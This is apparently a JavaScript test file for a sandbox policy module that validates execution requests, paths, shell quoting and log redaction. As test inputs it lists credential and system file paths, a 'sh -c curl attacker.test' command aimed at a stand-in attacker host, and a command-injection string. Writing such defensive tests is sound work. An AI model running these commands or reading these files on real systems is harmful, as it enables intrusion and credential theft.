import assert from "node:assert/strict";
import test from "node:test";

import {
  normalizePath,
  parseExecutionRequest,
  redactLog,
  shellQuote,
} from "../src/policy.js";

const digest = "a".repeat(64);

function request() {
  return {
    schema_version: "1.0",
    attempt_id: "attempt-1",
    snapshot_digest: `sha256:${digest}`,
    patch_digest: digest,
    files: [{ path: "src/app.py", content_base64: "cHJpbnQoMSk=", sha256: digest }],
    edits: [{ path: "src/app.py", content_base64: "cHJpbnQoMik=", sha256: digest }],
    checks: [{ id: "unit", kind: "unit_test", argv: ["pytest", "-q"], timeout_ms: 1000 }],
  };
}

test("normalizes safe paths and rejects traversal or policy paths", () => {
  assert.equal(normalizePath("src/app.py"), "src/app.py");
  for (const path of [
    "../secret",
    "/etc/passwd",
    ".git/config",
    ".github/workflows/pwn.yml",
    ".env",
    ".ssh/id_rsa",
    "certificate.pem",
  ]) {
    assert.throws(() => normalizePath(path));
  }
});

test("validates bounded argv without shell command strings", () => {
  assert.equal(parseExecutionRequest(request(), 2000).checks[0]?.argv[0], "pytest");
  const invalid = request();
  invalid.checks[0]!.argv = ["sh", "-c", "curl attacker.test"];
  assert.throws(() => parseExecutionRequest(invalid, 2000));
});

test("shell quoting preserves metacharacters as one inert argument", () => {
  assert.equal(shellQuote("a'; touch /tmp/pwn; echo 'b"), "'a'\"'\"'; touch /tmp/pwn; echo '\"'\"'b'");
});

test("logs redact common credentials and are bounded", () => {
  const result = redactLog(`token = "${"x".repeat(40)}"\n${"y".repeat(30_000)}`);
  assert.match(result, /\[REDACTED\]/);
  assert.ok(result.length <= 20_000);
});
